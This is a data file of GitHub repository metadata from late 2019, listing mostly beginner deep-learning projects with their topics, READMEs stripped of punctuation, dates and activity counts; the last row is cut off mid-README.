Saadat108,Learning-DeepLearning,machine-learning#neural-network,three layer neural network using python learning how neural networks work and writing one myself documentation I have mainly used the book Make Your Own Neural Network by Tariq Rashid for this further docs numpy pandas dataset used MNIST official dataset by Yann LeCun http yann lecun com exdb mnist CSV format MNIST dataset website http pjreddie com projects mnist in csv CSV format MNIST train dataset http www pjreddie com media files mnisttrain csv CSV format MNIST test dataset http www pjreddie com media files mnisttest csv,2019-11-09T07:49:43Z,2019-11-13T13:43:34Z,Jupyter Notebook,Saadat108,User,1,1,0,10,master,Saadat108,1,0,0,0,0,0,0
sksenthilkumar,DeepLearning,n/a,,2019-11-16T16:55:02Z,2019-11-27T21:04:13Z,Python,sksenthilkumar,User,1,1,0,13,master,sksenthilkumar,1,0,0,0,0,0,0
jinchengll,DeepLearning,n/a,Written by jinchengll DeepLearning Pytorch Tensorflow datasets MSVD https github com jinchengll DeepLearning tree master datasets MSVD models Neural Turing Machine https github com jinchengll DeepLearning tree master models NTM projects VideoCaption https github com jinchengll DeepLearning tree master projects S2VT tools,2019-11-11T08:36:56Z,2019-11-11T09:01:17Z,Python,jinchengll,User,1,1,0,2,master,jinchengll,1,0,0,0,0,0,0
anshudaur,DeepLearning,n/a,DeepLearning,2019-11-27T13:54:24Z,2019-12-13T15:02:08Z,Jupyter Notebook,anshudaur,User,1,1,0,25,master,anshudaur,1,0,0,0,0,0,0
xibelly,DeepLearning,n/a,DeepLearning,2019-11-02T02:55:02Z,2019-11-07T01:34:42Z,Jupyter Notebook,xibelly,User,1,1,0,3,master,xibelly,1,0,0,0,0,0,0
kmaheshkulkarni,DeepLearningUsingR,n/a,DeepLearningUsingR,2019-11-11T17:36:00Z,2019-11-22T10:42:05Z,n/a,kmaheshkulkarni,User,1,1,0,1,master,kmaheshkulkarni,1,0,0,0,0,0,0
youngbinYoon,DeepLearning_Keras,n/a,,2019-12-04T03:43:48Z,2019-12-11T04:47:33Z,Jupyter Notebook,youngbinYoon,User,1,1,0,2,master,youngbinYoon,1,0,0,0,0,0,0
shafiqulislamsumon,DeepTransferLearning,n/a,Transfer Learning Models VGG16 and InceptionV3 models are trained on ImageNet http www image net org dataset These pretrained models can be used to train on custom image dataset and add some layers to fine tune the models It transfers the knowledge from one dataset to another dataset which are similar Dataset Custom image dataset of 4 categories Models VGG16 InceptionV3 Tools Jupyter Notebook Description 2 image classification models are used for transfer learning VGG16 and InceptionV3 Sample image images sampleimage png InceptionV3 Train loss vs validation loss images traintestloss png InceptionV3 train accuracy vs validation accuracy images traintestaccuracy png,2019-11-08T01:22:24Z,2019-11-09T07:11:59Z,Jupyter Notebook,shafiqulislamsumon,User,1,1,0,5,master,shafiqulislamsumon,1,0,0,0,0,0,0
cnethanchang,NLP_DeepLearning,n/a,NLPDeepLearning There are some common algorithms that you can use for NLP The code contains examples for pytorch The structure of the repository is the following 1 neutalnetworklanguagemodel 2 skipgram 2 1 skipgramsimple 2 2 kipgramcomplex 2 3 skipgramsoftmax 3 negativesampling 4 CNNfortext 4 1 cnnfortextclassificationsimple 4 2 cnnfortextclassificationcomplex 5 RNNfortext 6 LSTMfortest 6 1 LSTMfortestsimple 6 2 LSTMfortestsimple 7 Seq2seq 8 Attention 8 1 attentionseq2seqrnn 8 2 attentionbilstm 8 3 attentiontranslationcomplex 9 Transformer 10 Bert 10 1 bertsimple 10 2 Bert Chinese classification task,2019-12-11T08:44:34Z,2019-12-11T09:09:31Z,Jupyter Notebook,cnethanchang,User,1,1,0,4,master,renzhongzhizha,1,0,0,0,0,0,0
krantirk,deepLearningBook-Notes,n/a,The Deep Learning Book Goodfellow I Bengio Y and Courville A 2016 This content is part of a series following the chapter 2 on linear algebra from the Deep Learning Book http www deeplearningbook org by Goodfellow I Bengio Y and Courville A 2016 It aims to provide intuitions drawings python code on mathematical theories and is constructed as my understanding of these concepts Boost your data science skills Learn linear algebra I d like to introduce a series of blog posts and their corresponding Python Notebooks gathering notes on the Deep Learning Book http www deeplearningbook org from Ian Goodfellow Yoshua Bengio and Aaron Courville 2016 The aim of these notebooks is to help beginners advanced beginners to grasp linear algebra concepts underlying deep learning and machine learning Acquiring these skills can boost your ability to understand and apply various data science algorithms In my opinion it is one of the bedrock of machine learning deep learning and data science These notes cover the chapter 2 on Linear Algebra I liked this chapter because it gives a sense of what is most used in the domain of machine learning and deep learning It is thus a great syllabus for anyone who want to dive in deep learning and acquire the concepts of linear algebra useful to better understand deep learning algorithms You can find all the articles here https hadrienj github io Getting started with linear algebra The goal of this series is to provide content for beginners who wants to understand enough linear algebra to be confortable with machine learning and deep learning However I think that the chapter on linear algebra from the Deep Learning book http www deeplearningbook org is a bit tough for beginners So I decided to produce code examples and drawings on each part of this chapter in order to add steps that may not be obvious for beginners I also think that you can convey as much information and knowledge through examples than through general definitions The illustrations are a way to see the big picture of an idea Finally I think that coding is a great tool to experiment concretely these abstract mathematical notions Along with pen and paper it adds a layer of what you can try to push your understanding through new horizons Coding is a great tool to concretely experiment abstract mathematical notions Graphical representation is also very helpful to understand linear algebra I tried to bind the concepts with plots and code to produce it The type of representation I liked most by doing this series is the fact that you can see any matrix as linear transformation of the space In several chapters we will extend this idea and see how it can be useful to understand eigendecomposition Singular Value Decomposition SVD or the Principal Components Analysis PCA The use of Python Numpy In addition I noticed that creating and reading examples is really helpful to understand the theory It is why I built Python notebooks The goal is two folds 1 To provide a starting point to use Python Numpy to apply linear algebra concepts And since the final goal is to use linear algebra concepts for data science it seems natural to continuously go between theory and code All you will need is a working Python installation with major mathematical librairies like Numpy Scipy Matplotlib 2 Give a more concrete vision of the underlying concepts I found hugely useful to play and experiment with these notebooks in order to build my understanding of somewhat complicated theoretical concepts or notations I hope that reading them will be as useful Syllabus The syllabus follow exactly the Deep Learning Book http www deeplearningbook org so you can find more details if you can t understand one specific point while you are reading it Here is a short description of the content 1 Scalars Vectors Matrices and Tensors https hadrienj github io posts Deep Learning Book Series 2 1 Scalars Vectors Matrices and Tensors Difference between a scalar a vector a matrix and a tensor Light introduction to vectors matrices transpose and basic operations addition of vectors of matrices Introduces also Numpy functions and finally a word on broadcasting 2 Multiplying Matrices and Vectors https hadrienj github io posts Deep Learning Book Series 2 2 Multiplying Matrices and Vectors The dot product explained This chapter is mainly on the dot product vector and or matrix multiplication We will also see some of its properties Then we will see how to synthesize a system of linear equations using matrix notation This is a major process for the following chapters 3 Identity and Inverse Matrices https hadrienj github io posts Deep Learning Book Series 2 3 Identity and Inverse Matrices An identity matrix We will see two important matrices the identity matrix and the inverse matrix We will see why they are important in linear algebra and how to use it with Numpy Finally we will see an example on how to solve a system of linear equations with the inverse matrix 4 Linear Dependence and Span https hadrienj github io posts Deep Learning Book Series 2 4 Linear Dependence and Span A system of equations has no solution 1 solution or an infinite number of solutions In this chapter we will continue to study systems of linear equations We will see that such systems can t have more than one solution and less than an infinite number of solutions We will see the intuition the graphical representation and the proof behind this statement Then we will go back to the matrix form of the system and consider what Gilbert Strang call the row figure we are looking at the rows that is to say multiple equations and the column figure looking at the columns that is to say the linear combination of the coefficients We will also see what is linear combination Finally we will see examples of overdetermined and underdetermined systems of equations 5 Norms https hadrienj github io posts Deep Learning Book Series 2 5 Norms Shape of a squared L2 norm in 3 dimensions The norm of a vector is a function that takes a vector in input and outputs a positive value It can be thinks as the length of the vector It is for example used to evaluate the distance between the prediction of a model and the actual value We will see different kind of norms L 0 L 1 L 2 with examples 6 Special Kinds of Matrices and Vectors https hadrienj github io posts Deep Learning Book Series 2 6 Special Kinds of Matrices and Vectors A diagonal left and a symmetric matrix right We have seen in 2 3 https hadrienj github io posts Deep Learning Book Series 2 3 Identity and Inverse Matrices some special matrices that are very interesting We will see other type of vectors and matrices in this chapter It is not a big chapter but it is important to understand the next ones 7 Eigendecomposition https hadrienj github io posts Deep Learning Book Series 2 7 Eigendecomposition We will see some major concepts of linear algebra in this chapter We will start by getting some ideas on eigenvectors and eigenvalues We will see that a matrix can be seen as a linear transformation and that applying a matrix on its eigenvectors gives new vectors with same direction Then we will see how to express quadratic equations into a matrix form We will see that the eigendecomposition of the matrix corresponding to the quadratic equation can be used to find its minimum and maximum As a bonus we will also see how to visualize linear transformation in Python 8 Singular Value Decomposition https hadrienj github io posts Deep Learning Book Series 2 8 Singular Value Decomposition We will see another way to decompose matrices the Singular Value Decomposition or SVD Since the beginning of this series I emphasized the fact that you can see matrices as linear transformation in space With the SVD you decompose a matrix in three other matrices We will see that we can see these new matrices as sub transformation of the space Instead of doing the transformation in one movement we decompose it in three movements As a bonus we will apply the SVD to image processing We will see the effect of SVD on an example image of Lucy the goose so keep on reading 9 The Moore Penrose Pseudoinverse https hadrienj github io posts Deep Learning Book Series 2 9 The Moore Penrose Pseudoinverse We saw that not all matrices have an inverse It is unfortunate because the inverse is used to solve system of equations In some cases a system of equation has no solution and thus the inverse doesnt exist However it can be useful to find a value that is almost a solution in term of minimizing the error This can be done with the pseudoinverse We will see for instance how we can find the best fit line of a set of data points with the pseudoinverse 10 The Trace Operator https hadrienj github io posts Deep Learning Book Series 2 10 The Trace Operator The trace of matrix We will see what is the Trace of a matrix It will be needed for the last chapter on the Principal Component Analysis PCA 11 The Determinant https hadrienj github io posts Deep Learning Book Series 2 11 The determinant Link between the determinant of a matrix and the transformation associated with it This chapter is about the determinant of a matrix This special number can tell us a lot of things about our matrix 12 Example Principal Components Analysis https hadrienj github io posts Deep Learning Book Series 2 12 Example Principal Components Analysis Gradient descent This is the last chapter of this series on linear algebra It is about Principal Components Analysis PCA We will use some knowledge that we acquired along the preceding chapters to understand this important data analysis tool Requirements This content is aimed at beginners but it should be easier for people with at least some experience with mathematics Enjoy I hope that you will find something interesting in that series I tried to be as accurate as I could If you find errors misunderstandings typos Please report it You can send me emails or open issues and pull request in the notebooks Github References Goodfellow I Bengio Y Courville A 2016 Deep learning MIT press,2019-12-01T08:29:53Z,2019-12-10T06:34:31Z,Jupyter Notebook,krantirk,User,1,1,0,64,master,hadrienj#ahlusar1989,2,0,0,0,0,0,0
develooper1994,DeepLearningCaseStudies,casestudies#deep-learning-case-studies#deeplearning#deeplearningcasestudies#exercises#learning-exercises#master-thesis#matlab#neural-network#python#python3#tensorflow,DeepLearningCaseStudies It is my learning exercises for deep learning I have to learn and complete a master thesis First file is tensorflow tutorial and exercises added siraj raval exercises Matlab support added but might not continue in future This repo not yet complete Derin renme teori ve az uygulama https www youtube com playlist list PLrPKUEV0N1BRO8uli 5 XysJSXcsl nMM Pytorch https www youtube com playlist list PLrPKUEV0N1BRs2fpx0uAvtPkBGwAtPLYm,2019-12-04T17:30:13Z,2019-12-13T17:33:09Z,Jupyter Notebook,develooper1994,User,1,1,0,47,master,develooper1994,1,0,0,0,0,0,5
debanga,DeepLearningNotebooks,colaboratory#deep-neural-networks,DeepLearningNotebooks Notebooks on Machine Learning in particular Deep Learning Concepts,2019-12-02T01:39:20Z,2019-12-14T23:55:24Z,Jupyter Notebook,debanga,User,1,1,0,24,master,debanga,1,0,0,0,0,0,0
kartik4949,DeepLearningEssentials,deep-learning-tutorial#deeplearning#deeplearning-papers#deeplearningbook,About This Repo contains Deep Learning Computer Vision Essentials Books Python Tensorfow Deep Learning References and Paper Arxiv IEEE Code Snippets Tensorflow snippets Keras Source Code Project Source Code Building Blocks Common CV building blocks Data Augmentation Image Generators Usage Useful for Building Basic to Advance CV projects Contributing Pull requests are welcome For major changes please open an issue first to discuss what you would like to change Please make sure to update tests as appropriate,2019-11-11T11:09:59Z,2019-11-13T12:10:27Z,Python,kartik4949,User,1,1,0,7,master,kartik4949,1,0,0,0,0,0,0
Pletnev-N,DeepLearningLabs,n/a,DeepLearningLabs,2019-11-12T23:49:48Z,2019-11-17T17:22:35Z,n/a,Pletnev-N,User,1,1,0,1,master,Pletnev-N,1,0,0,1,0,1,0
NikolayOskolkov,DeepLearningNeanderthalIntrogression,n/a,,2019-12-08T07:11:05Z,2019-12-08T22:08:11Z,HTML,NikolayOskolkov,User,1,1,0,3,master,NikolayOskolkov,1,0,0,0,0,0,0
zhuyuehong,build_DeepLearning_server,n/a,CNN x64tensorflow pythonUbuntuUbuntupython2 73 6python python3 6 anacondaconda APPAPP shellAPP zhuyuehongok1 gmail com,2019-11-29T06:14:32Z,2019-11-29T06:32:39Z,n/a,zhuyuehong,User,1,1,0,3,master,zhuyuehong,1,0,0,0,0,0,0
namekun,deepLearningStudy,n/a,,2019-11-23T07:49:21Z,2019-12-03T12:16:08Z,Python,namekun,User,1,1,0,4,master,namekun,1,0,0,0,0,0,0
zem007,DeepLearning_lib,n/a,DeepLearninglib DeepLearninglib is a Python library with dataio image procesing and neural networks based on tensorflow and or keras frameworks The main features of this library are 1 High level API all folders include base class and derived classes except the utils folder 2 Multiple models for tensorflow and keras are included seperately 3 Helpful losses and metircs functions for tensorflow if you are using keras you need to derive losses and metrics function from keras libs by yourself 4 Helpful functions like image processing and visualization tools will add more update 11 28 2019 Unet3D model for segmentation has been updated to the libs Some part of codes are heavily borrowed from https github com ellisdg 3DUnetCNN,2019-11-28T02:36:28Z,2019-12-12T05:23:15Z,Jupyter Notebook,zem007,User,1,1,0,4,master,zem007,1,0,0,0,0,0,0
retkowsky,AzureMLservice_DeepLearning,azuremlservice#deep-learning#jupyter-notebook#python,Azure ML service Deep Learning Deep Learning examples with Azure ML service Pour en savoir plus sur Azure ML Service https azure microsoft com en us services machine learning service Serge Retkowsky serge retkowsky microsoft com https www linkedin com in serger,2019-11-13T09:53:26Z,2019-11-13T09:55:54Z,Jupyter Notebook,retkowsky,User,1,1,0,4,master,retkowsky,1,0,0,0,0,0,0
Aayushktyagi,DeepLearning_Resources,n/a,Deep Learning Resources Repository contains variour Machine learning Deep learning and computer vision approaches Image Processing Notebook Covers following Loading image using opencv Using filter for Edge computation Feature extraction and visualization using HOG PyRadiomics Notebook Cover following Loading images Image visualization with segemenation Feature extraction using Pyradiomics Logistic and linear regression Notebook Covers following Loading dataset into csv format Heart disease dataset for logistic regression and diabetes dataset for linear regression converting pandas dataframe to tf data format Convarience matrix calculation Training linear regression using Sklearn Training logistic regresison using tensorflow SVM Notebook Covers following Loading dataset in csv format Training SVM with Grid Search Model evaluation,2019-11-07T07:48:40Z,2019-12-12T10:08:10Z,Jupyter Notebook,Aayushktyagi,User,1,1,0,12,master,Aayushktyagi,1,0,0,0,0,0,0
ashoats,DeepSeededGeneticLearning,n/a,Deep Seeded Genetic Learning Dependencies Python 3 sudo apt get update sudo apt get install python3 6 OpenAIGym pip install gym PyTorch pip3 install torch torchvision MuJoCo Source https github com openai mujoco py 1 Obtain a 30 day free trial on the MuJoCo website or free license if you are a student The license key will arrive in an email with your username and password 2 Download the MuJoCo version 2 0 binaries for Linux or OSX 3 Unzip the downloaded mujoco200 directory into mujoco mujoco200 and place your license key the mjkey txt file from your email at mujoco mjkey txt pip3 install U mujoco py 2 0 To save simulation videos sudo apt get install ffmpeg,2019-11-05T17:19:25Z,2019-12-09T05:39:31Z,Jupyter Notebook,ashoats,User,3,1,0,23,master,ashoats,1,0,0,0,0,0,0
azm-tarique,Deep-Learning,n/a,Deep Learning Deep Learning,2019-12-07T07:45:02Z,2019-12-07T07:47:41Z,Jupyter Notebook,azm-tarique,User,1,1,0,2,master,azm-tarique,1,0,0,0,0,0,0
dashuaifei,deep-learning,n/a,,2019-11-27T01:25:18Z,2019-11-27T01:32:14Z,n/a,dashuaifei,User,1,1,0,0,master,,0,0,0,0,0,0,0
okarimpour,Deep_Learning,n/a,Deep Learning deep learning specialization coursera python3 logisticregression py results txt,2019-11-12T17:01:16Z,2019-11-21T16:27:10Z,Python,okarimpour,User,1,1,0,11,master,okarimpour,1,0,0,0,0,0,0
AccessDenied1,Deep-Learning,n/a,Deep Learning This repo is for the Institute course Deep Learning,2019-11-25T12:57:16Z,2019-11-25T13:09:56Z,Jupyter Notebook,AccessDenied1,User,1,1,0,2,master,AccessDenied1,1,0,0,0,0,0,0
VISHAL0713,Deep-Learning,n/a,,2019-12-11T17:39:56Z,2019-12-11T17:40:34Z,n/a,VISHAL0713,User,1,1,0,0,master,,0,0,0,0,0,0,0
zhouhua852,Interesting-semantic-segmentation,n/a,Interesting semantic segmentation Description A beginner in semantic segmentation this repository records the models I wrote during learning image semantic segmentation some experiments and various possible ideas Directories data Store temporary data folders including model weights files and object files logs Store tensorboard information folder used to observe loss and acc change information during training logs log txt Store log when use run sh to training models Store model files test Test models or datasets utils Some common utils and preprocessing utils run sh one click run script the usage is shown below Use environment System Ubuntu 14 04 Dependencies python 3 6 tensorflow gpu 1 4 1 cuda 8 0 keras 2 0 8 Models The following models are currently implemented FCN Unet PSPnet SegNet To do moels deeplabv3 DenseNet Usage Train Use script sh run FCN dataset1 keras py The program will run in the background the output information and errors will be saved in log txt in logs directory or you can use python python python FCN dataset1 keras py Model weights and history object will be saved in the data directory Evaluation python python evaluation py You need to modify the model weights and history object path in evaluation py the loss acc val loss val acc mIou and predict picture from test data will be saved in data directory Dataset dataset1 https drive google com file d 0B0d9ZiqAgFkiOHR1NTJhWVJMNEU view usp sharing PASCAL VOC 2012 http host robots ox ac uk pascal VOC voc2012 VOCtrainval11 May 2012 tar,2019-11-09T13:59:09Z,2019-12-04T07:22:57Z,Jupyter Notebook,zhouhua852,User,1,1,0,81,master,zhouhua852,1,0,0,0,0,1,0
krantirk,Deep-Learning,n/a,DeepLearning bit ly awesome dl https bit ly awesome dl This repository keeps track of my path towards understanding Deep Learning concepts mainly with TensorFlow What can you find here Links to my personal projects while learning Deep Learning and Tensorflow Links for online resources to get started with Deep Learning and TensorFlow Personal Projects Getting Started with Deep Learning with MNIST https github com mari linhares mnist tensorflow MNIST running on Android https github com mari linhares mnist android tensorflow Exploring Spiral Dataset exploring spiral dataset Vanilla GANs for fashion MNIST GAN fashion MNIST Easy 21 Getting started with Reinforcement Learning https github com mari linhares easy21 TensorFlow Brasil A repository for TensorFlow code samples and tutorials in Portuguese https github com mari linhares tensorflow brasil Teachable games Using DeepLearnJS to play games just using a camera https github com mari linhares teachable machine games Modified version of text generation tutorial including fun examples https github com mari linhares tf eager text generation Get Started with Deep Learning and TensorFlow Go to bit ly awesome dl https bit ly awesome dl DL and ML 101 blog posts and videos to get started A friendly introduction to Deep Learning and Neural Networks https www youtube com watch v BR9h47Jtqyw How Deep Neural Networks Work https www youtube com watch v ILsA4nyG7I0 Tensorflow and deep learning without a PhD Martin Gorner Google https www youtube com watch v sEciSlAClL8 t 2163s TensorFlow Tutorial Sherry Moore Google Brain https www youtube com watch v Ejec3IDh0w Math for Deep Learning and Machine Learning The Matrix Calculus You Need For Deep Learning https arxiv org abs 1802 01528 3Blue1Brown Youtube Channel https www youtube com channel UCYOjabesuFRV4b17AJtAw CNNs Convolutional Neural Networks How Convolutional Neural Networks work https www youtube com watch v FmpDIaiMIeA t 1s RNNs Recurrent Neural Networks Understanding LSTM Networks http colah github io posts 2015 08 Understanding LSTMs The Unreasonable Effectiveness of Recurrent Neural Networks http karpathy github io 2015 05 21 rnn effectiveness GANs Generative Adversarial Networks Original Paper https arxiv org abs 1406 2661 Introduction to GANs Keras https www analyticsvidhya com blog 2017 06 introductory generative adversarial networks gans GANs for beginners TensorFlow https www oreilly com learning generative adversarial networks for beginners Blog post about the different kinds of GANs http guimperarnau com blog 2017 03 Fantastic GANs and where to find them DCGAN implementation on TensorFlow https github com carpedm20 DCGAN tensorflow Generative models implementation TensorFlow Pytorch https github com wiseodd generative models RL Reinforcement Learning Full Course by David Silver https www youtube com watch v 2pWv7GOvuf0 list PLzuuYNsE1EZAXYR4FJ75jcJseBmo4KQ9 Blogs Colah s Blog http colah github io Open AI https blog openai com Fast AI http www fast ai University Courses CS 20SI TensorFlow for Deep Learning Research http web stanford edu class cs20si syllabus html CS231n Convolutional Neural Networks for Visual Recognition http cs231n github io MIT 6 S094 Deep Learning for Self Driving Cars https www youtube com playlist list PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf Youtube series Siraj Raval https www youtube com channel UCWN3xxRkmTPmbKwht9FuE5A sentdex https www youtube com channel UCfzlCWGWYyIQ0aLC5w48gBQ Hvass Lab https www youtube com user hvasslabs videos Google Dev Machine Learning Recipes https www youtube com watch v cKxRvEZd3Mw index 7 list PLOU2XLYxmsIIuiBfYad6rFYQUjL2ryal 3Blue1Brown https www youtube com channel UCYOjabesuFRV4b17AJtAw GO DEEP learn more about deep learning in 1 or 2 months How do I learn deep learning in 2 months https www quora com How do I learn deep learning in 2 months Learn deep learning from novice to advanced https www commonlounge com discussion 81f5bbcfea4e44b9b2bd081d1ea536ac main Advanced tutorials Jason Mayes Rock Paper Scissors Machine Learning Style using Tensor Flow https www youtube com watch v mtRDNDqjUzM,2019-12-01T07:35:25Z,2019-12-02T18:24:47Z,Jupyter Notebook,krantirk,User,1,1,0,31,master,mari-linhares#jcnsilva,2,0,0,0,0,0,0
vincomnis,deep-learning1-uva-2019,n/a,Deep Learning Course Practical Assignments University of Amsterdam Fall 2019,2019-11-14T12:05:52Z,2019-12-13T11:26:21Z,TeX,vincomnis,User,1,1,0,0,master,,0,0,0,0,0,0,0
sindhujeendru,Deep-Learning,n/a,Deep Learning,2019-11-13T00:27:42Z,2019-11-13T00:48:24Z,Jupyter Notebook,sindhujeendru,User,1,1,0,2,master,sindhujeendru,1,0,0,0,0,0,0
TejasMorbagal,Deep-Learning,n/a,Deep Learning Neural networks are making a comeback Deep learning has taken over the machine learning community by storm with success both in research and commercially Deep learning is applicable over a range of fields such as computer vision speech recognition natural language processing robotics etc This repository includes the fundamentals of neural networks and then progress to state of the art convolutional and recurrent neural networks as well as their use in applications for visual recognition I will implement and train my own network for visual recognition tasks such as object recognition image segmentation and caption generation,2019-11-06T19:04:36Z,2019-12-11T11:48:11Z,Jupyter Notebook,TejasMorbagal,User,1,1,0,9,master,TejasMorbagal,1,0,0,0,0,0,0
DishinGoyani,Deep-Learning,classify-dog-breeds#cv2#deep-learning#dlnd#nanodegree#neural-network#seinfeld#transfer-learning#tutorial#tv-scripts#udacity,Deep Learning Deep learning projects Dog breed clasifier Humans Detection Haar feature based cascade classifiers https docs opencv org trunk db d28 tutorialcascadeclassifier html Detect Dogs Pre trained model to detect dogs in images VGG 16 https pytorch org docs master torchvision models html CNN to Classify Dog Breeds from Scratch CNN to Classify Dog Breeds using Transfer Learning inceptionv3 https pytorch org docs master torchvision models html More about dog breed clasifier project https github com DishinGoyani Deep Learning tree master Dog 20breed 20classifier project overview Generate TV Script Generating fake Seinfeld https en wikipedia org wiki Seinfeld TV scripts using RNNs Dataset https www kaggle com thec03u5 seinfeld chronicles scripts csv Seinfeld Chronicles complete Seinfeld scripts and episode details RNN Architecture long short term memory LSTM Using PyTorch https pytorch org docs stable nn html highlight lstm torch nn LSTM More about generate TV script project https github com DishinGoyani Deep Learning tree master Generate 20TV 20Script tv script generation Generative Adversarial Network MNIST Generate new handwritten digits using GANs https en wikipedia org wiki Generativeadversarialnetwork trained on MNIST dataset Used fully connected layers architecture in PyTorch More about generative adversarial network MNIST project https github com DishinGoyani Deep Learning tree master Generative 20Adversarial 20Network MNIST generative adversarial network mnist,2019-11-07T10:19:45Z,2019-12-11T11:21:18Z,HTML,DishinGoyani,User,1,1,0,18,master,DishinGoyani,1,0,0,0,0,0,0
Jelly123456,Deep-learning-and-Machine-learning,n/a,Data Science projects All the projects I have done during course study in NUS online training Udacity and Data competitions Kaggle Predicting blood donation The goal of the project is to predict the future blood donation Facial key points detection The goal of the project is to detect the face key points with computer vision and deep learning techniques Implement SLAM The goal of the project is to detect the landmark and track the landmark,2019-11-07T01:27:29Z,2019-11-13T01:23:27Z,Jupyter Notebook,Jelly123456,User,1,1,0,14,master,Jelly123456,1,0,0,0,0,0,1
Alan-D-Chen,Deep_Learning,deeplearning#desiciontree#python3,DeepLearning coding lines for Deep learning descion tree Pyhton 3 6 Pycharm This is a simple demo for desicion tree 01 desicion tree If you get that dot you will find some help from here help1 https blog csdn net mingyuli article details 81192459 help2 https www cnblogs com hankleo p 9733076 html help3 https blog csdn net jingsiyu6588 article details 88966820 0 If you get that csv reader object has no attribute next you will find some help from here help1 https www cnblogs com hfdkd p 7719134 html best wish for you,2019-11-23T11:13:40Z,2019-11-23T11:54:08Z,Python,Alan-D-Chen,User,1,1,0,12,master,Alan-D-Chen,1,0,0,0,0,0,0
brunocampos01,deep-learning,n/a,deep learning,2019-11-12T02:26:46Z,2019-12-15T02:13:44Z,Jupyter Notebook,brunocampos01,User,1,1,0,16,master,brunocampos01,1,0,0,0,0,0,0
rashtell,deep-learning,n/a,deep learning,2019-11-21T16:44:36Z,2019-11-22T11:05:12Z,Python,rashtell,User,1,1,0,2,master,rashtell,1,0,0,0,0,0,0
sbisen,Deep-Learning,n/a,,2019-11-06T05:03:15Z,2019-11-06T05:05:46Z,Jupyter Notebook,sbisen,User,1,1,0,1,master,sbisen,1,0,0,0,0,0,0
NMADALI97,Deep-Learning,n/a,,2019-12-07T08:54:12Z,2019-12-07T09:05:05Z,Jupyter Notebook,NMADALI97,User,1,1,0,1,master,NMADALI97,1,0,0,0,0,0,0
ashen7,deep_learning,n/a,,2019-12-05T13:23:43Z,2019-12-14T14:02:30Z,Python,ashen7,User,1,1,0,15,master,ashen7,1,0,0,0,0,0,0
MonicaVashu,Deep-Learning,n/a,Deep Learning Includes course projects from 676 Deep Learning,2019-11-25T18:27:20Z,2019-12-02T19:27:33Z,Jupyter Notebook,MonicaVashu,User,1,1,0,3,master,MonicaVashu,1,0,0,0,0,0,0
Daichi-Hayashi-kyoto,deep-learning,n/a,,2019-11-23T13:46:31Z,2019-12-13T08:52:33Z,Jupyter Notebook,Daichi-Hayashi-kyoto,User,1,1,0,9,master,Daichi-Hayashi-kyoto,1,0,0,0,0,0,0
wesley-chiang,-Deep-learning,n/a,,2019-11-07T14:11:26Z,2019-11-07T14:23:51Z,n/a,wesley-chiang,User,1,1,0,1,master,wesley-chiang,1,0,0,0,0,0,0
mzouink,DeepReinforcementLearning-NavigationProject-Udacity,n/a,Image References image1 https user images githubusercontent com 10624937 42135619 d90f2f28 7d12 11e8 8823 82b970a54d7e gif Trained Agent Deep Reinforcement Learning Project Banana Collector Agent Introduction For this project i train an agent to navigate and collect bananas in a large square world Trained Agent image1 A reward of 1 is provided for collecting a yellow banana and a reward of 1 is provided for collecting a blue banana Thus the goal of your agent is to collect as many yellow bananas as possible while avoiding blue bananas The state space has 37 dimensions and contains the agent s velocity along with ray based perception of objects around agent s forward direction Given this information the agent has to learn how to best select actions Four discrete actions are available corresponding to 0 move forward 1 move backward 2 turn left 3 turn right The task is episodic and in order to solve the environment your agent must get an average score of 13 over 100 consecutive episodes Getting Started Before to start create your environment using requirements txt pip install r requirements txt Before to start you need to set the path of Banana env file Ubuntu server x86 headless I trained the model using distant Ubuntu server with GPU that s why i used Banana BananaLinuxNoVis Banana x8664 Mac to visualise the result using Graphic interface i used my Mac that s why i selected Banana app env UnityEnvironment filename FILE I created the code so that the agent is able to use its experience to gradually choose better actions when interacting with the environment I created our own agent to solve the environment I trained the model with 2000 episodes I save finalcheckpoint in the end I save checkpoint when first time we reach 13 reward Code implementation I got the start code from Lunar Lander first project using Deep Reinforcement Learning from Deep Reinforcement Learning Nanodegree https www udacity com course deep reinforcement learning nanodegree nd893 Then I changed from using Gym env to Udacity ML Agent env I adjusted for being used with the banana environment My code consist of model py I implimented PyTorch QNetwork class Regular fully connected Deep Neural Network The input is 37 as we have 37 dimensions and the output action are 4 the 4 movement dqnagent py A DQN agent and a Replay Buffer memory used by the DQN agent Navigation ipynb Jupyter notebooks of the main project used to train the model and plot and test the results Steps Import resources Packages Test the State and Action Spaces Test Random Actions Train an agent using DQN Plot the scores RESULTS Training logs images traininglog png Training plot images trainingplot png Need to be added Improve training using Double DQN Prioritized Experience Replay Dueling DQN,2019-11-17T14:30:54Z,2019-11-21T17:07:41Z,Jupyter Notebook,mzouink,User,1,1,0,11,master,mzouink#dependabot[bot],2,0,0,0,0,1,1
jihoonerd,Deep-Reinforcement-Learning-with-Double-Q-learning,n/a,Deep Reinforcement Learning with Double Q learning atlantisplaying assets atlantis gif This repository implements the paper Deep Reinforcement Learning with Double Q learning https arxiv org abs 1509 06461 The authors of the paper applied Double Q learning https papers nips cc paper 3964 double q learning concept on their DQN algorithm This paper proposed Double DQN which is similar to DQN but more robust to overestimation of Q values The major difference between those two algorithms is the way to calculate Q value from target network Compared to the DQN directly using Q value from target network DDQN chooses an action that maximizes the Q value of main network at the next state DQN dqnytarget assets ydqn png DDQN ddqnytarget assets yddqn png Most of the implementation is almost the same as the implementation of DQN https github com jihoonerd Human level control through deep reinforcement learning Features Employed TensorFlow 2 with performance optimization Simple structure Easy to reproduce You can see detailed explanation posting at HERE I am working on this yet smile Model Structure nn svg assets nn svg Requirements Refer requirements txt or Pipfile You can set your virtual environment by virtualenv recommended or pipenv Default running environment is assumed to be CPU ONLY If you want to run this repo on GPU machine just replace tensorflow to tensorflow gpu in package lists How to install virtualenv bash virtualenv venv source venv bin activate pip install r requirements txt pipenv bash pipenv install If you have trouble making virtual environment through pipenv try followings Get your python interpreter by bash which python Use the python interpreter to make virtual environment bash pipenv install three python YOUR PYTHON PATH Also in case of locking does not work you can simply skip it bash pipenv install skip lock How to run You can run Atari 2600 game with main py Running environment needs to be NoFrameskip from gym package bash python main py help usage main py h env ENV train play PLAY loginterval LOGINTERVAL saveweightinterval SAVEWEIGHTINTERVAL Atari DQN optional arguments h help show this help message and exit env ENV Should be NoFrameskip environment train Train agent with given environment play PLAY Play with a given weight directory loginterval LOGINTERVAL Interval of logging stdout saveweightinterval SAVEWEIGHTINTERVAL Interval of saving weights Example 1 Train BreakoutNoFrameskip v4 bash python main py env BreakoutNoFrameskip v4 train Example 2 Play PongNoFrameskip v4 with trained weights 